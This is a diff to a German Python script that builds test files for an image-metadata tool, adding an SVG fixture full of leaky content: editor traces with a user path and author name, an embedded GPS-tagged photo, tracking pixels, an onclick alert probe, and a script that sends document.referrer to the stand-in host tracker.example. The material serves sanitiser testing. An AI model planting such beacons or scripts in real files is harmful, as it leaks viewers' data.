@@ -335,6 +335,65 @@ except ImportError:
     print("  HINWEIS: pillow-heif fehlt, HEIC/AVIF-Vorlagen entfallen")
     print("           nachruesten mit: pip install pillow-heif")
 
+# ---------------------------------------------------------------------------
+# SVG
+#
+# Das ungewoehnlichste Format: beliebiges XML mit Programmcode, Verweisen auf
+# fremde Rechner und einem eingebetteten Foto samt GPS. Die Vorlage bildet ab,
+# was Inkscape tatsaechlich hinterlaesst -- einschliesslich des Dateipfads mit
+# dem Benutzernamen.
+# ---------------------------------------------------------------------------
+
+import base64  # noqa: E402
+
+with open(os.path.join(ZIEL, "foto_mit_exif.jpg"), "rb") as f:
+    _foto_b64 = base64.b64encode(f.read()).decode()
+
+_bs = chr(92)
+_svg_pfad = f"C:{_bs}Users{_bs}daniw{_bs}Entwuerfe{_bs}Angebot-final-v3.svg"
+
+_svg_zeilen = [
+    '<?xml version="1.0" encoding="UTF-8"?>',
+    '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"'
+    ' "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
+    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"',
+    '     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"',
+    '     xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"',
+    '     xmlns:dc="http://purl.org/dc/elements/1.1/"',
+    '     xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"',
+    '     width="200" height="200" viewBox="0 0 200 200"',
+    '     inkscape:version="1.1.2 (b8e25be833, 2022-02-05)"',
+    f'     sodipodi:docname="{_svg_pfad}">',
+    "  <!-- Entwurf von Dr. Anna Beispiel, Kanzlei Muster -->",
+    "  <title>Interner Entwurf</title>",
+    "  <desc>Nicht an den Kunden geben</desc>",
+    "  <metadata><rdf:RDF><dc:creator>Dr. Anna Beispiel</dc:creator>",
+    "    <dc:title>Angebot Nordstern</dc:title></rdf:RDF></metadata>",
+    '  <sodipodi:namedview inkscape:zoom="1.4" inkscape:cx="100"/>',
+    '  <script>fetch("https://tracker.example/melde?wer=" + document.referrer)</script>',
+    '  <g inkscape:label="Ebene 1" inkscape:groupmode="layer" transform="translate(10,10)">',
+    '    <rect width="80" height="80" fill="#c81e1e" stroke-width="2" onclick="alert(1)"/>',
+    f'    <image x="90" y="0" width="80" height="80"'
+    f' xlink:href="data:image/jpeg;base64,{_foto_b64}"/>',
+    '    <image x="0" y="90" width="40" height="40" href="https://tracker.example/pixel.png"/>',
+    '    <circle cx="140" cy="140" r="20" style="fill:url(https://fremd.example/m.png)"/>',
+    '    <text x="10" y="180" font-family="serif" font-size="12">Sichtbarer Text</text>',
+    "  </g>",
+    "</svg>",
+]
+
+with open(os.path.join(ZIEL, "zeichnung_mit_metadaten.svg"), "w",
+          encoding="utf-8", newline="\n") as f:
+    f.write("\n".join(_svg_zeilen) + "\n")
+
+manifest.append({
+    "datei": "zeichnung_mit_metadaten.svg",
+    "format": "SVG",
+    "beschreibung": "SVG mit Skript, Zaehlpixel, Editorspuren und eingebettetem Foto",
+    "erwartet": {"hat_gps": True, "hat_vorschaubild": True,
+                 "groesse": [200, 200], "modus": "RGB"},
+})
+
 with open(os.path.join(ZIEL, "manifest.json"), "w", encoding="utf-8", newline="\n") as f:
     json.dump({
         "beschreibung": "Echte Bilddateien mit echten Metadaten, erzeugt mit Pillow und piexif.",
